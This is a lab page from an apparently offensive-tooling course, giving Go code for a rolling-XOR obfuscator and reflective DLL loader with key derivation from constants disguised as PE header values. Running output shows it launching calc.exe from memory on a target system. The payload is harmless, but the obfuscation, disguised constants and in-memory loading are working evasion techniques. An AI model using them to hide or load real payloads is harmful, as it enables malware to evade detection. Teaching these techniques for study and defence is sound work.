---
showTableOfContents: true
title: "Implementing Key Derivation (Lab 7.2)"
type: "page"
---
## Goal

We'll now use our new rolling XOR function to both encrypt (on DLL-side) and decrypt (on loader-side) our DLL. 
Additionally, we are going to implement a specific key derivation mechanism. This involves generating a "shared secret" from disguised constants and then deriving a session-specific key using that secret plus dynamic parameters. For now, since we have not yet implemented a Client-Server model however we'll simulate the dynamic parameters using placeholders, and then in the next module's lab we'll simple "connect" our actual dynamic parameters.

**So let's break this down into 3 clear steps:**
1. Add the necessary constants and functions (`generatePEValidationKey`, `deriveKeyFromParams`, and their helpers) to both our obfuscator tool and the reflective loader.
2. Modify our obfuscator tool to use these functions with placeholder dynamic data (timestamp, client ID) to generate a key, and then obfuscate `calc_dll.dll` using the `rollingXor` function (from Lab 7.1).
3. Modify the reflective loader to use the _exact same_ key derivation functions and placeholder data to generate the decryption key, decrypt the obfuscated file using `rollingXor`, and then proceed with reflective loading.

**Also, just so we are on the same page, we'll start this Lab with 3 files:**
- Our `calc_dll.dll` from Lab 1.1 (we'll use this in the end, but it won't be modified)
- Our reflective loader with simple XOR function from Lab 6.2
- Our obfuscator tool from Lab 6.2


## Step 1:  Add the Necessary Constants + Functions

- To *both* the obfuscator and reflective loader add the following code.
- This represents the "initial information" from which we are going to derive our key

```go
    import (
        "encoding/binary" // Make sure this is imported
    )
    
    // --- Key Derivation Constants and Functions ---
    
    // Disguised PE constants used for shared secret generation
    const (
    	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp"
    	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k"
    	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v"
    	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue"
    	PE_CHECKSUM_SEED          = 0x67891011 // Seed for second part
    )
    
    // Helper to construct first part of shared secret
    func getPESectionAlignmentString() string {
    	buffer := make([]byte, 16)
    	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
    	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
    	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
    	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
    	return string(buffer) // Returns "Sample-key-value"
    }
    
    // Helper to construct second part of shared secret
    func verifyPEChecksumValue(seed uint32) string {
    	result := make([]byte, 4)
    	checksum := seed
    	for i := 0; i < 4; i++ {
    		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
    		result[i] = byte(checksum & 0xFF)
    	}
    	// The specific bytes depend on the seed calculation, e.g., could be something like [0x88 0x0F 0x9A 0x2B]
    	return string(result)
    }
    
    // Generates the full "shared secret" string
    func generatePEValidationKey() string {
    	alignmentSignature := getPESectionAlignmentString()
    	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
    	return alignmentSignature + checksumSignature // Concatenates the two parts
    }
    
    // Derives the final session key from shared secret and dynamic parameters
    func deriveKeyFromParams(timestamp, clientID string, sharedSecret string) string {
    	combined := sharedSecret + timestamp + clientID
    	// Simple key stretching/derivation: repeat/truncate combined string to 32 bytes
    	key := make([]byte, 32)
    	lenCombined := len(combined)
        if lenCombined == 0 { // Avoid division by zero if combined is empty
             return string(key) // Return zero key
        }
    	for i := 0; i < 32; i++ {
    		key[i] = combined[i%lenCombined]
    	}
    	return string(key)
    }
    ```


- Additionally, for both tools once again find and remove the existing `xorEncryptDecrypt` function (this is of course our simple XOR function from Lab 6.2)
- Replace it with this new rolling XOR implementation from Lab 7.1


```go
    func xorEncryptDecrypt(data []byte, key []byte) []byte {
        // ... (implementation from Lab 7.1) ...
        keyBytes := []byte(key)
        keyLen := len(keyBytes)
        result := make([]byte, len(data))
        if len(data) == 0 { return []byte{} }
        if keyLen == 0 {
            // Handle empty key case if necessary, maybe return data unmodified or error
            log.Println("[!] Warning: Rolling XOR key derived is empty. Returning original data.")
            copy(result, data)
            return result
        }
        for i := 0; i < len(data); i++ {
            keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
            result[i] = data[i] ^ keyByte
        }
        return result
    }
```


## Step 2: Modify our Obfuscator Tool
We've added most of the new logic we need our obfuscator, but we need to "rewire" the main function to use it now instead of the hardcoded key + simple XOR. So replace the existing main() function
with the following. Note our `timestamp` and `clientID` parameters are static placeholder values for now, in the future we'll derive these from requests sent by the client (i.e. loader).


```go
    func main() {
    	fmt.Println("[+] DLL Obfuscator Tool (Rolling XOR + Derived Key)")
    
    	// --- Configuration ---
    	inputDllPath := "calc_dll.dll"
    	outputFilePath := "calc_dll.rkd.xor" // New output name
    	// Placeholders for dynamic data (MUST MATCH THE LOADER'S PLACEHOLDERS)
    	timestamp := "1712345678" // Example static timestamp
    	clientID := "MyTestClient-9876" // Example static client ID
    
    	fmt.Printf("[+] Input DLL: %s\n", inputDllPath)
    	fmt.Printf("[+] Output File: %s\n", outputFilePath)
    	fmt.Printf("[+] Placeholder Timestamp: %s\n", timestamp)
    	fmt.Printf("[+] Placeholder ClientID: %s\n", clientID)
    
        // --- Derive Key ---
        fmt.Println("[+] Deriving obfuscation key...")
        sharedSecret := generatePEValidationKey()
        finalKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)
        fmt.Printf("    Shared Secret (generated): %s\n", sharedSecret) // Example: "Sample-key-value...."
        fmt.Printf("    Final Key (derived, Hex): %X\n", []byte(finalKey))
    
    	// --- Read Input DLL ---
        fmt.Printf("[+] Reading input DLL '%s'...\n", inputDllPath)
    	plaintextBytes, err := os.ReadFile(inputDllPath)
    	if err != nil { log.Fatalf("[-] Failed to read input file: %v\n", err) }
        fmt.Printf("[+] Read %d bytes from input DLL.\n", len(plaintextBytes))
    
    	// --- Obfuscate using Rolling XOR and Derived Key ---
    	fmt.Println("[+] Obfuscating DLL bytes using Rolling XOR...")
    	obfuscatedBytes := xorEncryptDecrypt(plaintextBytes, []byte(finalKey))
    	fmt.Println("[+] Obfuscation complete.")
    
    	// --- Write Output File ---
    	fmt.Printf("[+] Writing %d obfuscated bytes to '%s'...\n", len(obfuscatedBytes), outputFilePath)
    	err = os.WriteFile(outputFilePath, obfuscatedBytes, 0644)
    	if err != nil { log.Fatalf("[-] Failed to write output file: %v\n", err) }
    	fmt.Println("[+] Output file written successfully.")
    	fmt.Println("[+] Obfuscator finished.")
    }
    ```



## Step 3: Modify our Reflective Loader
Similar to what we've just done above, we also have to reconfigure our loader tool to use the new key derivation logic.

First off, remove the following since we won't be using it any longer.

```go
xorKey := []byte{0x55, 0xAA, 0x55, 0xAA, 0x11, 0x22, 0x33, 0x44}  
fmt.Printf("[+] Using XOR Key (Hex): %X\n", xorKey)
```

At that same position we can add the following (i.e. before Step 1 - Read DLL and Parse Headers)

```go
        timestamp := "1712345678" // Example static timestamp
        clientID := "MyTestClient-9876" // Example static client ID
    
        fmt.Printf("[+] Placeholder Timestamp: %s\n", timestamp)
    	fmt.Printf("[+] Placeholder ClientID: %s\n", clientID)
    
    
        // --- Derive Key ---
        fmt.Println("[+] Deriving decryption key...")
        sharedSecret := generatePEValidationKey()
        finalKey := deriveKeyFromParams(timestamp, clientID, sharedSecret)
        fmt.Printf("    Shared Secret (generated): %s\n", sharedSecret)
        fmt.Printf("    Final Key (derived, Hex): %X\n", []byte(finalKey))
```


- The following step will stay the exact same, since we will still be loading the file, this time of course it will be `calc_dll.rkd.xor`

```go
	// --- Step 1: Read DLL and Parse Headers ---
	if len(os.Args) < 2 {
		log.Fatalf("[-] Usage: %s <path_to_dll>\n", os.Args[0])
	}
	dllPath = os.Args[1]
	fmt.Printf("[+] Reading file: %s\n", dllPath)
	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		log.Fatalf("[-] Failed to read file '%s': %v\n", dllPath, err)
	}
```


- Following this we can remove our old decryption logic
```go
	// --- *** ADD DECRYPTION STEP HERE *** ---
	fmt.Println("[+] Decrypting file content using XOR key...")
	dllBytes = xorEncryptDecrypt(dllBytes, xorKey) // Decrypt into dllBytes
	fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))
	// --- *** END DECRYPTION STEP *** ---
```


- We can then replace it with our new logic

```go
	// --- Read Obfuscated File ---
	dllBytes, err := os.ReadFile(dllPath)
	if err != nil { log.Fatalf("[-] Failed to read file '%s': %v\n", dllPath, err) }
	fmt.Printf("[+] Read %d obfuscated bytes from file.\n", len(dllBytes))
	    
	// --- Decrypt using Rolling XOR and Derived Key ---
	fmt.Println("[+] Decrypting file content using Rolling XOR key...")
	dllBytes = xorEncryptDecrypt(dllBytes, []byte(finalKey)) // Decrypt
	fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))
```



## Instructions
- Compile the new application.

```shell
GOOS=windows GOARCH=amd64 go build  
```

- Then copy it over to target system and invoke from command-line, providing as argument now the `.xor` we’d like to decrypt + run,

```bash
".\reflect_roll.exe .\calc_dll.rkd.xor"  
```


## Results
```go
PS C:\Users\vuilhond\Desktop> .\reflect_roll.exe .\calc_dll.rkd.xor
[+] Starting Manual DLL Mapper (with IAT Resolution)...
[+] Placeholder Timestamp: 1712345678
[+] Placeholder ClientID: MyTestClient-9876
[+] Deriving decryption key...
    Shared Secret (generated): pmaSk-elv-yeeula�nm
    Final Key (derived, Hex): 706D61536B2D656C762D796565756C618B6E196D313731323334353637384D79
[+] Reading file: .\calc_dll.rkd.xor
[+] Read 111493 obfuscated bytes from file.
[+] Decrypting file content using Rolling XOR key...
[+] Decryption complete. Resulting size: 111493 bytes.
[+] Parsed PE Headers successfully.
[+] Target ImageBase: 0x26A5B0000
[+] Target SizeOfImage: 0x22000 (139264 bytes)
[+] Allocating 0x22000 bytes of memory for DLL...
[+] DLL memory allocated successfully at actual base address: 0x26A5B0000
[+] Copying PE headers (1536 bytes) to allocated memory...
[+] Copied 1536 bytes of headers successfully.
[+] Copying sections...
[+] All sections copied.
[+] Checking if base relocations are needed...
[+] Image loaded at preferred base. No relocations needed.
[+] Processing Import Address Table (IAT)...
[+] Import processing complete (7 DLLs).
[+] Locating and calling DLL Entry Point (DllMain)...
[+] Entry Point found at RVA 0x1330 (VA 0x26A5B1330).
[+] Calling DllMain(0x26A5B0000, DLL_PROCESS_ATTACH, 0)...
    [+] DllMain executed successfully (returned TRUE).
[+] Locating exported function: LaunchCalc
[+] Export Directory found at RVA 0x8000
    NumberOfNames: 1, NumberOfFunctions: 1
[+] Searching Export Name Pointer Table (ENPT)...
    [+] Found target function name 'LaunchCalc' at index 0.
        Ordinal: 0
        Function RVA: 0x1491
[+] Target function 'LaunchCalc' located at VA: 0x26A5B1491
[+] Calling target function 'LaunchCalc' at 0x26A5B1491...
    [+] Exported function 'LaunchCalc' executed successfully (returned TRUE).
        ==> Check if Calculator launched! <==

[+] ===== FINAL LOADER STATUS =====
[+] Manual mapping & execution process complete.
[+] Self-Check Suggestion:
    - Verify console output shows successful completion of all stages (Parse, Alloc, Map, Reloc Check, IAT, DllMain, Export Call).
    - PRIMARY CHECK: Verify that 'calc.exe' was launched successfully!
    - (Optional) Use Process Hacker/Explorer to observe the loader process briefly running and launching the payload.

[+] Press Enter to free memory and exit.

[+] Mapper finished.
[+] Attempting to free main DLL allocation at 0x26A5B0000...
[+] Main DLL memory freed successfully.
```

- And of course `calc.exe` should also once again appear.


## Discussion
Our results are as expected, the output has not changed from before, but of course what's happening under the hood has. The fact however that we are still able to launch `calc.exe` proves to us that our  implementation of rolling XOR, as well as key derivation logic, was a success.

## Conclusion
In the penultimate module next we'll integrate a client + server model. This will finally allow us to inject and execute our DLL directly into memory, without it ever needing to touch disk.



---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "rolling_lab.md" >}})
[|NEXT|]({{< ref "../module08/client_server.md" >}})